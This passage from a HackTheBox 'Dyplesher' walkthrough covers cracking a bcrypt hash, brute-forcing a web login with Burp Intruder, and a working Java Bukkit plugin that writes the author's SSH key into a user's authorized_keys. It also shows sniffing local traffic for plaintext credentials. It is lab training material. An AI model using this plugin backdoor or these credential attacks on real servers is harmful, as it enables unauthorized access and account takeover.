
There did not seem to be anything that was actually useful other than a potential database to check out.

```text
┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4e/07]
└─$ git clone --mirror 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle repo/.git
Cloning into bare repository 'repo/.git'...
Receiving objects: 100% (51/51), 20.94 MiB | 98.79 MiB/s, done.
Resolving deltas: 100% (5/5), done.

┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4e/07]
└─$ cd repo

┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]
└─$ git init
Reinitialized existing Git repository in /home/zweilos/htb/dyplesher/repositories/@hashed/4e/07/repo/.git/

┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]
└─$ git checkout

┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]
└─$ git status                           
On branch master
nothing to commit, working tree clean

┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]                                                                                               ┌──(zweilos㉿kalimaa)-[~/…/@hashed/4e/07/repo]
└─$ ls -la    
total 38376
drwxr-xr-x 7 zweilos zweilos     4096 Oct 10 20:21 .
drwx------ 4 zweilos zweilos     4096 Oct 10 20:19 ..
-rw-r--r-- 1 zweilos zweilos        2 Oct 10 20:21 banned-ips.json
-rw-r--r-- 1 zweilos zweilos        3 Oct 10 20:21 banned-players.json
-rw-r--r-- 1 zweilos zweilos     1304 Oct 10 20:21 bukkit.yml
-rw-r--r-- 1 zweilos zweilos      623 Oct 10 20:21 commands.yml
-rw-r--r-- 1 zweilos zweilos 19427415 Oct 10 20:21 craftbukkit-1.8.jar
-rw-r--r-- 1 zweilos zweilos      180 Oct 10 20:21 eula.txt
drwxr-xr-x 7 zweilos zweilos     4096 Oct 10 20:21 .git
-rw-r--r-- 1 zweilos zweilos       77 Oct 10 20:21 .gitignore
-rw-r--r-- 1 zweilos zweilos     2576 Oct 10 20:21 help.yml
-rw-r--r-- 1 zweilos zweilos        2 Oct 10 20:21 ops.json
-rw-r--r-- 1 zweilos zweilos        0 Oct 10 20:21 permissions.yml
drwxr-xr-x 4 zweilos zweilos     4096 Oct 10 20:21 plugins
drwxr-xr-x 2 zweilos zweilos     4096 Oct 10 20:21 python
-rw-r--r-- 1 zweilos zweilos      798 Oct 10 20:21 README.md
-rw-r--r-- 1 zweilos zweilos   147843 Oct 10 20:21 sc-mqtt.jar
-rw-r--r-- 1 zweilos zweilos      770 Oct 10 20:21 server.properties
-rw-r--r-- 1 zweilos zweilos 19629658 Oct 10 20:21 spigot-1.8.jar
-rw-r--r-- 1 zweilos zweilos      413 Oct 10 20:21 start.command
-rw-r--r-- 1 zweilos zweilos        2 Oct 10 20:21 usercache.json
-rw-r--r-- 1 zweilos zweilos        2 Oct 10 20:21 whitelist.json
drwxr-xr-x 5 zweilos zweilos     4096 Oct 10 20:21 world
drwxr-xr-x 3 zweilos zweilos     4096 Oct 10 20:21 world_the_end
```

The next repository contained many more files, and looked to be the main code for this Minecraft server.

![](../../.gitbook/assets/11-gitlab-code-4e.png)

```text
┌──(zweilos㉿kalimaa)-[~/htb/dyplesher]
└─$ tree repositories    
repositories
└── @hashed
    ├── 4b
    │   └── 22
    │       ├── 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
    │       └── repo
    │           ├── LICENSE
    │           ├── README.md
    │           └── src
    │               └── VoteListener.py
    ├── 4e
    │   └── 07
    │       ├── 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
    │       ├── 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
    │       └── repo
    │           ├── banned-ips.json
    │           ├── banned-players.json
    │           ├── bukkit.yml
    │           ├── commands.yml
    │           ├── craftbukkit-1.8.jar
    │           ├── eula.txt
    │           ├── help.yml
    │           ├── ops.json
    │           ├── permissions.yml
    │           ├── plugins
    │           │   ├── LoginSecurity
    │           │   │   ├── authList
    │           │   │   ├── config.yml
    │           │   │   └── users.db
    │           │   ├── LoginSecurity.jar
    │           │   └── PluginMetrics
    │           │       └── config.yml
    │           ├── python
    │           │   └── pythonMqtt.py
    │           ├── README.md
    │           ├── sc-mqtt.jar
    │           ├── server.properties
    │           ├── spigot-1.8.jar
    │           ├── start.command
    │           ├── usercache.json
    │           ├── whitelist.json
    │           ├── world
    │           │   ├── data
    │           │   │   ├── villages.dat
    │           │   │   └── villages_end.dat
    │           │   ├── level.dat
    │           │   ├── level.dat_mcr
    │           │   ├── level.dat_old
    │           │   ├── playerdata
    │           │   │   └── 18fb40a5-c8d3-4f24-9bb8-a689914fcac3.dat
    │           │   ├── region
    │           │   │   ├── r.0.0.mca
    │           │   │   └── r.-1.0.mca
    │           │   ├── session.lock
    │           │   └── uid.dat
    │           └── world_the_end
    │               ├── DIM1
    │               │   └── region
    │               │       ├── r.0.0.mca
    │               │       ├── r.0.-1.mca
    │               │       ├── r.-1.0.mca
    │               │       └── r.-1.-1.mca
    │               ├── level.dat
    │               ├── level.dat_old
    │               ├── session.lock
    │               └── uid.dat
    ├── 6b
    │   └── 86
    │       └── 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
    └── d4
        └── 73
            └── d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle

24 directories, 47 files

```

This repository contained a lot of files.  I started with checking out `craftbukkit.jar` which turned out to be code for hosting a Minecraft server.  [https://getbukkit.org/](https://getbukkit.org/) 

> GetBukkit The most reliable and secure Minecraft server mirror.
>
> Get Bukkit strives to be available 24 hours a day and 7 days a week for server owners, hosts, and the general public, providing the safest and most trusted third-party Minecraft server mirror.

![](../../.gitbook/assets/13-bukkit-conf.png)

I found some potential database login information in `bukkit.yml` but couldn't figure out how to connect to it.

![](../../.gitbook/assets/13-minecraft-settings.png)

The file `server.properties` had a flag in the motd field but nothing else useful was to be found.

```text
┌──(zweilos㉿kali)-[~/…/4e/07/repo/plugins]
└─$ ls
LoginSecurity  LoginSecurity.jar  PluginMetrics

┌──(zweilos㉿kali)-[~/…/4e/07/repo/plugins]
└─$ cd LoginSecurity 

┌──(zweilos㉿kali)-[~/…/07/repo/plugins/LoginSecurity]
└─$ ls
authList  config.yml  users.db
```

In the plugins folder there was a `LoginSecurity.jar` and related files, including a `users.db` which looked interesting. 

![](../../.gitbook/assets/14-loginsecurity-configyml.png)

The file `config.yml` had more database credentials, this time for a MySQL database.

### The users database

![](../../.gitbook/assets/14-loginsecurity-usersdb.png)

I opened up `users.db` in the DB browser for SQLite an started looking through it.  There was not a lot of information stored in this database.

![](../../.gitbook/assets/14-loginsecurity-usersdb-password.png)

The `users` table contained only one record, but it held another bcrypt password hash.

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ hashcat -O -D1,2 -a0 -m3200 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

Kernel /usr/share/hashcat/OpenCL/m03200-optimized.cl:
Optimized kernel requested but not needed - falling back to pure kernel

Hashfile 'hashes' on line 3 ($2a$10...GefnAH3zipl.FRNySz5C4RjitiwUoalS): Token length exception
Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte

INFO: Removed 1 hash found in potfile.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6:alexis1
```

I decrypted the hash with hashcat and found another password: `alexis1`.  Once more I tried SSH login and failed, so again I tried using burp's Intruder on the main site's \([http://dyplesher.htb](http://dyplesher.htb)\) login page.

![](../../.gitbook/assets/15-sitelogin2.png)

First, I captured a login request to the site, and configured Intruder to only brute force the name portion of the email field.  I went under the assumption that the email address would end in `@dyplesher.htb` since that was what I found on the internal Gogs site.

![](../../.gitbook/assets/15-sitelogin.png)

I set the payload to only contain the list of names I had found on the site.

![](../../.gitbook/assets/15-sitelogin-intruder.png)

After running Intruder, I got a redirect to the `/home` page after logging in using `felamos@dyplesher.htb`and `alexis1`. 

### The Minecraft server site

![](../../.gitbook/assets/15-logged-in.png)

After logging in I was greeted by a fancy dashboard with all sorts of statistics that made it look like this was a pretty successful game server \(contrary to the headline of 'Worst Minecraft server'\).

![](../../.gitbook/assets/15-console.png)

The console tab showed a running activity log for the game server.

![](../../.gitbook/assets/15-users.png)

On the players tab I found a page with a potential list of more usernames. 

![](../../.gitbook/assets/15-plugin-add.png)

There was also a plugin upload page, which looked very interesting since it seemed I had permissions to upload files. Next I did some research on creating malicious Minecraft plugins to see if I could get code execution on the server through uploading my own plugin.

### Crafting a malicious Minecraft plugin

At [https://www.spigotmc.org/resources/spigot-anti-malware-detects-over-200-malicious-plugins.64982/](https://www.spigotmc.org/resources/spigot-anti-malware-detects-over-200-malicious-plugins.64982/) I came across information about an addon for detecting malicious plugins which I had seen mention of in the source somewhere.  I was worried about potentially having to do encoding/obfuscation on my file uploads _\(It didn't end up being an issue\)_.

On the site [https://www.instructables.com/Creating-a-Minecraft-Plugin/](https://www.instructables.com/Creating-a-Minecraft-Plugin/) I found instructions on making a Minecraft plugin.

> Creating a Minecraft Plugin
>
> Important Info
>
> 1. You need to be proficient in Java
> 2. You need to know about general programming concepts
>
> Steps
>
> · Download the necessary files.
>
> · Create an eclipse Java project.
>
> · Create a plugin.yml.
>
> · Learn some bukkit basics.
>
> · Learn some bukkit advanced topics.

I did a lot of research on writing Minecraft plugins and coding in Java.  I have used Eclipse for writing simple Java programs in the past but...well it's definitely not my favorite IDE or language.

* How to write bukkit plugins from: 
  * https://bukkit.gamepedia.com/Plugin\_Tutorial
  * https://hypixel.net/threads/guide-start-coding-minecraft-bukkit-plugins.1084267/
  * https://stackoverflow.com/questions/22359193/bukkit-getting-a-response-from-a-php-file
* how to write to files in Java: 
  * https://www.w3schools.com/java/java\_files\_create.asp
  * https://stackoverflow.com/questions/3984185/how-to-write-a-java-desktop-app-that-can-interact-with-my-websites-api
* Bukkit plugin code example from:
  * https://github.com/Bukkit/SamplePlugin

![](../../.gitbook/assets/16-eclipse.png)

First I fired up the Eclipse IDE and loaded the Bukkit sample plugin.  Next I added a package to the project.

![](../../.gitbook/assets/16-add-jars.png)

While adding the new package I added the different .jar files I had found in the source code as libraries to the project since they seemed to all be dependencies for this plugin.

![](../../.gitbook/assets/16-plugin.yml.png)

One of the required files I had to create was called plugin.yml, and contained some basic configuration information about the plugin.

![](../../.gitbook/assets/16-pom.png)

Another required file for the plugin was `pom.xml`.  This one contained basic information about the plugin such as the name, version,  and the dependencies.

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher] 
└─$ ssh-keygen -t ecdsa Generating public/private ecdsa key pair. 
Enter file in which to save the key (/home/zweilos/.ssh/id_ecdsa): dyplesher.key 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in dyplesher.key Your public key has been saved in dyplesher.key.pub

┌──(zweilos㉿kali)-[~/htb/dyplesher] 
└─$ cat dyplesher.key.pub
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali
```

I created a new SSH key to use to try to log in to each user on the machine.

```java
/**
 * key-writer plugin for dyplesher
 *
 * @author zweilos
 */
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;

public class Plugin extends JavaPlugin {

    @Override
    public void onEnable() {

        try {
            Writer minatoWrite = new BufferedWriter(new OutputStreamWriter(new FileOutputStream("/home/MinatoTW/.ssh/authorized_keys"), "utf-8"));
            minatoWrite.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali");
            minatoWrite.close();
        } catch(IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public void onDisable() {

    }
}
```

For the main Java program I wrote my plugin to write the public key I generated to the `authorized_keys` file of each user, to the default folder such as `/home/MinatoTW/.ssh`.  After uploading my plugin on the site and reloading the page I tried to log in through SSH.

![](../../.gitbook/assets/16-code.png)

The final list of files included in my project before compiling.  After I built my `dyplesher-plugin.jar` file I uploaded it through the portal and hoped that it would pass inspection and be loaded.

## Initial Foothold

### Enumeration as `MinatoTW`

```text
┌──(zweilos㉿kali)-[~/htb/dyplesher]
└─$ ssh -i dyplesher.key MinatoTW@dyplesher.htb 
The authenticity of host 'dyplesher.htb (10.10.10.190)' can't be established.
ECDSA key fingerprint is SHA256:8AtWtgBblX2fSG+yy8gqhogbr3lHiMCppbBkL1YY/Cg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dyplesher.htb,10.10.10.190' (ECDSA) to the list of known hosts.

Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 11 Oct 2020 08:11:30 PM UTC

  System load:  0.2               Processes:              238
  Usage of /:   6.9% of 97.93GB   Users logged in:        0
  Memory usage: 39%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Sun Oct 11 20:08:40 2020 from 10.10.14.216
MinatoTW@dyplesher:~$ id && hostname
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
dyplesher
```

After uploading my plugin I waited a short time, then tried to login to my first victim, `MinatoTW`.  I was pleasantly surprised to get logged in immediately.  I was a little sad after all that work, however, to find that this user did not have `user.txt`.  

### Reading local traffic with Tshark/Wireshark

My first bit of enumeration I always do when logging in as a new user is find out who I am and what privileges and permission I have.  Immediately I noticed that this user was in the Wireshark group, which sounded quite interesting as it meant that I could probably capture traffic on the local host. 

```text
MinatoTW@dyplesher:~$ tshark -i any -w /dev/shm/dyplesher.pcapng
Capturing on 'any'
249
```

Since I didn't have a GUI I decided to try running tshark to see if there was interesting traffic on the host. I wrote the captured packets to a .pcapng file and exfiltrated it to my computer after capturing for a few minutes.

![](../../.gitbook/assets/17-wireshark-erlang-rabbit.png)

I noticed pretty quickly the Erlang Port Mapper traffic identifying port 25672 as a RabbitMQ node.

![](../../.gitbook/assets/17-wireshark-memcached.png)

Next I identified some traffic that contained the memcache information I had pulled from that service earlier.  It looked like there was a `backup.sh` shell script running that was either reading to or writing an email, username, and password key to memcache.

![](../../.gitbook/assets/17-wireshark-amqp%20%281%29.png)

My next find in the packet capture was a jackpot.  There was a full list of user information being sent through AMQP that contained names, emails, and passwords for a list of users, amongst other information.

### Finding user creds

```text
AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...
EashAnicOc3Op
```

There was a login username and password for AMQPLAIN, which turned out to be the AAA controls for RabbitMQ \(Which I saw open on port 5672 earlier in my nmap output\). 

* [https://www.rabbitmq.com/access-control.html](https://www.rabbitmq.com/access-control.html)
* [https://www.amqp.org/about/what](https://www.amqp.org/about/what)

> The Advanced Message Queuing Protocol \(AMQP\) is an open standard for passing business messages between applications or organizations. It connects systems, feeds business processes with the information they need and reliably transmits onward the instructions that achieve their goals.
>
> AMQP enables applications send and receive messages. In this regard it is like instant messaging or email.

```text
Only root or rabbitmq should run rabbitmqctl
```

I tried adding a user but got an error. I guess I need to find a user in the rabbitmq group?

{% hint style="info" %}
Again I seem to have either failed to take notes, or something got deleted or overwritten in Joplin.  What I had done was: I tried using rabbitmgctl to add a user account for myself but got back the error message above.
{% endhint %}

```text
{"name":"Golda Rosenbaum","email":"randi.friesen@yahoo.com","address":"313 Scot Meadows Suite 035\nNorth Leann, ID 97610-9866","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Prof. Ross Grant","email":"lelia.gorczany@yahoo.com","address":"6857 Wehner Key Apt. 134\nNorth Federicobury, OR 86559","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Kristian Medhurst","email":"stanley22@treutel.com","address":"85098 Devin Locks Apt. 507\nMissouriside, ME 05589","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Dianna Dicki IV","email":"ohara.cale@hotmail.com","address":"61482 Desiree Rue\nRusselhaven, LA 55450","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Dr. Boyd Schulist","email":"neil88@steuber.com","address":"645 Hessel Road Suite 834\nNorth Duncan, WY 64960-0667","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Mr. Uriel Lindgren","email":"roberto.mraz@hoeger.com","address":"60668 Sporer Island Suite 801\nWeissnatshire, DC 13499-1375","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Fausto Stark","email":"gulgowski.fabiola@hotmail.com","address":"92045 Tressie Roads Apt. 408\nSchambergerbury, WY 66042","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Dr. Christa Cummings","email":"simone.treutel@gmail.com","address":"562 Claud Junctions\nNorth Eugenia, MA 63435","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Pearline Schmeler","email":"quitzon.eriberto@yahoo.com","address":"3394 Lavina Burg Apt. 481\nNew Darleneside, TX 37670","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Jamarcus Sanford","email":"americo83@bode.info","address":"4895 Clark Plains Suite 173\nLake Rudolphburgh, IL 64916","password":"ev6GwyaHTl5D","subscribed":true}
{"name":"Jamarcus Sanford","email":"americo83@bode.info","address":"4895 Clark Plains Suite 173\nLake Rudolphburgh, IL 64916","password":"ev6GwyaHTl5D","subscribed":true}
```

The first set of users from the packet capture all had the same password, 

```text
{"name":"MinatoTW","email":"MinatoTW@dyplesher.htb","address":"India","password":"bihys1amFov","subscribed":true}
{"name":"yuntao","email":"yuntao@dyplesher.htb","address":"Italy","password":"wagthAw4ob","subscribed":true
{"name":"felamos","email":"felamos@dyplesher.htb","address":"India","password":"tieb0graQueg","subscribed":true}
```

However the last three names seemed familiar and each had unique passwords.

## Path to Power \(Gaining Administrator Access\)

### Further enumeration as `MinatoTW`

Before trying to login as another user, I decided to look around a bit as `MinatoTW` first.

```text
MinatoTW@dyplesher:~$ ls -la
total 100
drwxr-xr-x 10 MinatoTW MinatoTW  4096 Oct 11 20:20 .
drwxr-xr-x  6 root     root      4096 Apr 23 13:58 ..
drwxr-xr-x  2 root     root      4096 Apr 23 12:53 backup
lrwxrwxrwx  1 root     root         9 Apr 23 15:13 .bash_history -> /dev/null
-rw-r--r--  1 MinatoTW MinatoTW   220 Apr 23 08:10 .bash_logout
-rw-r--r--  1 MinatoTW MinatoTW  3771 Apr 23 08:10 .bashrc
drwx------  2 MinatoTW MinatoTW  4096 Apr 23 15:20 .cache
drwxrwxr-x  3 MinatoTW MinatoTW  4096 Apr 23 10:24 .composer
drwxrwxr-x 11 MinatoTW MinatoTW  4096 Apr 23 15:14 Cuberite
-rw-------  1 MinatoTW MinatoTW 32860 Oct 11 20:22 dyplesher
-rw-rw-r--  1 MinatoTW MinatoTW    54 Apr 23 09:16 .gitconfig
drwx------  3 MinatoTW MinatoTW  4096 Apr 23 15:20 .gnupg
drwxrwxr-x  3 MinatoTW MinatoTW  4096 Apr 23 09:08 .local
drwxrwxr-x  6 MinatoTW MinatoTW  4096 Apr 23 09:58 paper
-rw-r--r--  1 MinatoTW MinatoTW   807 Apr 23 08:10 .profile
-rw-rw-r--  1 MinatoTW MinatoTW    66 Apr 23 09:08 .selected_editor
drwx------  2 MinatoTW MinatoTW  4096 May 20 13:45 .ssh
-rw-------  1 MinatoTW MinatoTW   802 Apr 23 15:18 .viminfo
```

This user's folder contained a few folders, and a lot of standard Linux user files that contained nothing useful.

```text
MinatoTW@dyplesher:~$ cd Cuberite/
MinatoTW@dyplesher:~/Cuberite$ ls -la
total 10144
drwxrwxr-x 11 MinatoTW MinatoTW    4096 Apr 23 15:14 .
drwxr-xr-x 10 MinatoTW MinatoTW    4096 Oct 11 20:24 ..
-rw-r--r--  1 MinatoTW MinatoTW     394 Sep  7  2019 BACKERS
-rw-r--r--  1 MinatoTW MinatoTW    3072 Sep  8  2019 banlist.sqlite
-rw-r--r--  1 MinatoTW MinatoTW    4418 Sep  7  2019 brewing.txt
-rw-r--r--  1 MinatoTW MinatoTW     105 Sep  7  2019 buildinfo
-rw-r--r--  1 MinatoTW MinatoTW    1185 Sep  7  2019 CONTRIBUTORS
-rw-r--r--  1 MinatoTW MinatoTW   52636 Sep  7  2019 crafting.txt
-rwxr-xr-x  1 MinatoTW MinatoTW 9942976 Sep  7  2019 Cuberite
-rw-r--r--  1 MinatoTW MinatoTW    2233 Sep  7  2019 favicon.png
-rw-r--r--  1 MinatoTW MinatoTW    8025 Sep  7  2019 furnace.txt
-rw-r--r--  1 MinatoTW MinatoTW  203507 Sep 11  2019 helgrind.log
-rwxr-xr-x  1 MinatoTW MinatoTW     316 Sep  7  2019 hg
-rw-r--r--  1 MinatoTW MinatoTW     581 Sep  7  2019 hg.supp
-rw-rw-r--  1 MinatoTW MinatoTW     872 Sep  8  2019 itemblacklist
-rw-r--r--  1 MinatoTW MinatoTW   26108 Sep  7  2019 items.ini
drwxr-xr-x  2 MinatoTW MinatoTW    4096 Sep  7  2019 lang
-rw-r--r--  1 MinatoTW MinatoTW   11641 Sep  7  2019 LICENSE
drwxr-xr-x  2 MinatoTW MinatoTW    4096 Sep  7  2019 Licenses
drwxrwxr-x  2 MinatoTW MinatoTW    4096 Oct 11 18:55 logs
-rw-r--r--  1 MinatoTW MinatoTW    3072 Apr 23 10:13 MojangAPI.sqlite
-rw-r--r--  1 MinatoTW MinatoTW    2576 Apr 23 17:08 MojangAPI.sqlite-journal
-rw-r--r--  1 MinatoTW MinatoTW    2738 Sep  7  2019 monsters.ini
-rw-rw-r--  1 MinatoTW MinatoTW      40 Sep  8  2019 motd.txt
drwxr-xr-x 11 MinatoTW MinatoTW    4096 Sep 16  2019 Plugins
drwxr-xr-x  4 MinatoTW MinatoTW    4096 Sep  7  2019 Prefabs
-rw-r--r--  1 MinatoTW MinatoTW    8192 Sep  8  2019 Ranks.sqlite
-rw-r--r--  1 MinatoTW MinatoTW     692 Sep  7  2019 README.txt
-rw-rw-r--  1 MinatoTW MinatoTW    1091 Oct 11 18:55 settings.ini
-rwxrwxr-x  1 MinatoTW MinatoTW      24 Sep  9  2019 start.sh
-rwxr-xr-x  1 MinatoTW MinatoTW     375 Sep  7  2019 vg
-rw-r--r--  1 MinatoTW MinatoTW       0 Sep  7  2019 vg.supp
drwxr-xr-x  3 MinatoTW MinatoTW    4096 Sep  8  2019 webadmin
-rw-rw-r--  1 MinatoTW MinatoTW     368 Apr 23 10:12 webadmin.ini
-rw-r--r--  1 MinatoTW MinatoTW    4096 Sep  8  2019 whitelist.sqlite
drwxrwxr-x  4 MinatoTW MinatoTW    4096 Sep  8  2019 world
drwxrwxr-x  4 MinatoTW MinatoTW    4096 Sep  8  2019 world_nether
drwxrwxr-x  4 MinatoTW MinatoTW    4096 Sep  8  2019 world_the_end
```

The `/Cuberite` folder contained a lot of files which looked to again be related to the Minecraft server.  After spending a lot of time looking through them, I concluded there was nothing interesting here.

```text
MinatoTW@dyplesher:~$ cd backup/
MinatoTW@dyplesher:~/backup$ ls
backup.sh  email  password  username
MinatoTW@dyplesher:~/backup$ vim backup.sh 
MinatoTW@dyplesher:~/backup$ vim password 
MinatoTW@dyplesher:~/backup$ vim email 
MinatoTW@dyplesher:~/backup$ ls -la
total 24
drwxr-xr-x  2 root     root     4096 Apr 23 12:53 .
drwxr-xr-x 10 MinatoTW MinatoTW 4096 Oct 11 21:24 ..
-rwxr-xr-x  1 root     root      170 Apr 23 08:32 backup.sh
-rwxr-xr-x  1 root     root       66 Apr 23 12:52 email
-rwxr-xr-x  1 root     root      182 Sep 15  2019 password
-rwxr-xr-x  1 root     root       24 Apr 23 12:51 username
MinatoTW@dyplesher:~/backup$ cat email 
MinatoTW@dyplesher.htb
felamos@dyplesher.htb
yuntao@dyplesher.htb
MinatoTW@dyplesher:~/backup$ cat password 
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
MinatoTW@dyplesher:~/backup$ cat username 
MinatoTW
felamos
yuntao
```

The next folder contained the `backup.sh` script I had noticed in my Wireshark packet capture.  

![](../../.gitbook/assets/18-backup-script.png)

In the `/backup` folder I found the script and files that had given me information earlier through memcached.

```text
MinatoTW@dyplesher:~$ cd paper
MinatoTW@dyplesher:~/paper$ ls -la
total 39392
drwxrwxr-x  6 MinatoTW MinatoTW     4096 Apr 23 09:58 .
drwxr-xr-x 10 MinatoTW MinatoTW     4096 May 20 13:41 ..
-rw-rw-r--  1 MinatoTW MinatoTW        2 Oct 12 04:40 banned-ips.json
-rw-rw-r--  1 MinatoTW MinatoTW        2 Oct 12 04:40 banned-players.json
-rw-rw-r--  1 MinatoTW MinatoTW     1049 Oct 12 04:40 bukkit.yml
drwxrwxr-x  2 MinatoTW MinatoTW     4096 Sep  8  2019 cache
-rw-rw-r--  1 MinatoTW MinatoTW      593 Oct 12 04:40 commands.yml
-rw-rw-r--  1 MinatoTW MinatoTW      221 Sep  8  2019 eula.txt
-rw-rw-r--  1 MinatoTW MinatoTW     2576 Sep  8  2019 help.yml
drwxrwxr-x  2 MinatoTW MinatoTW     4096 Oct 12 04:40 logs
-rw-rw-r--  1 MinatoTW MinatoTW        2 Oct 12 04:40 ops.json
-rw-rw-r--  1 MinatoTW MinatoTW 40248740 Sep  8  2019 paper.jar
-rw-rw-r--  1 MinatoTW MinatoTW     5417 Oct 12 04:40 paper.yml
-rw-rw-r--  1 MinatoTW MinatoTW        0 Sep  8  2019 permissions.yml
drwxrwxr-x  4 MinatoTW MinatoTW     4096 May 20 13:43 plugins
-rw-rw-r--  1 MinatoTW MinatoTW      723 Oct 12 04:40 server.properties
-rw-rw-r--  1 MinatoTW MinatoTW     3311 Oct 12 04:40 spigot.yml
-rwxrwxr-x  1 MinatoTW MinatoTW       48 Sep  8  2019 start.sh
-rw-rw-r--  1 MinatoTW MinatoTW        2 Oct 12 04:40 usercache.json
-rw-rw-r--  1 MinatoTW MinatoTW       48 Sep  8  2019 version_history.json
-rw-rw-r--  1 MinatoTW MinatoTW        2 Sep  8  2019 whitelist.json
drwxrwxr-x  5 MinatoTW MinatoTW     4096 Oct 12 13:21 world
```

The `/paper` folder contained even more plugin and configuration info for the Minecraft server, but again, nothing useful was there.

```text
MinatoTW@dyplesher:~/Cuberite/Plugins/DumpInfo$ sudo -l
[sudo] password for MinatoTW: 
Sorry, user MinatoTW may not run sudo on dyplesher.
MinatoTW@dyplesher:~/Cuberite/Plugins/DumpInfo$ su felamos
Password: 
felamos@dyplesher:/home/MinatoTW/Cuberite/Plugins/DumpInfo$ cd ~
```

Lastly, I tried checking if `MinatoTW` was able to run any commands as `sudo`, but despite the password I had found working for the user, I was unable to run any superuser commands.

### Enumeration as `felamos`

Next I tried using `felamos` password to switch users, and was successful.

```text
felamos@dyplesher:~$ ls -la
total 52
drwx------ 9 felamos felamos 4096 May 20 13:23 .
drwxr-xr-x 6 root    root    4096 Apr 23 13:58 ..
lrwxrwxrwx 1 root    root       9 Apr 23 15:12 .bash_history -> /dev/null
-rw-r--r-- 1 felamos felamos  220 May  5  2019 .bash_logout
-rw-r--r-- 1 felamos felamos 3771 May  5  2019 .bashrc
drwx------ 2 felamos felamos 4096 Apr 23 07:32 .cache
drwxrwxr-x 2 felamos felamos 4096 Apr 23 12:14 cache
drwx------ 3 felamos felamos 4096 Apr 23 07:32 .gnupg
drwxrwxr-x 3 felamos felamos 4096 May 20 13:23 .local
-rw-r--r-- 1 felamos felamos  807 May  5  2019 .profile
drwxr-xr-x 3 felamos felamos 4096 Apr 23 10:09 snap
drwxrwxr-x 2 felamos felamos 4096 Apr 23 15:21 .ssh
-rw-r--r-- 1 felamos felamos    0 Apr 23 16:14 .sudo_as_admin_successful
-rw-rw-r-- 1 felamos felamos   33 Oct 11 18:55 user.txt
drwxrwxr-x 2 felamos felamos 4096 Apr 23 17:37 yuntao
felamos@dyplesher:~$ id
uid=1000(felamos) gid=1000(felamos) groups=1000(felamos)
felamos@dyplesher:~$ sudo -l
[sudo] password for felamos: 
Sorry, user felamos may not run sudo on dyplesher.

```

`felamos` was also unable to run `sudo` commands.

### User.txt

```text
felamos@dyplesher:~$ cat user.txt 
a8ffa4d970e7a74c9039b7afd39c9dc8
```

However, I was happy to find the `user.txt` file under this user's home directory.

![](../../.gitbook/assets/18-yuntao-note.png)

in the `/yuntao` folder there was a file called`send.sh` with a note to `yuntao` regarding user created plugins and using the `plugin_data` Exchange and Queue. It also says to send the URL of new plugins and the server wil automatically add them. This looks like a good privilege escalation route if I could figure out how to publish a cuberite plugin.

![](../../.gitbook/assets/19-screen1.png)

While checking out running processes I noticed `screen` was running so I attached to each of the two sessions,

![](../../.gitbook/assets/19-screen2.png.png)

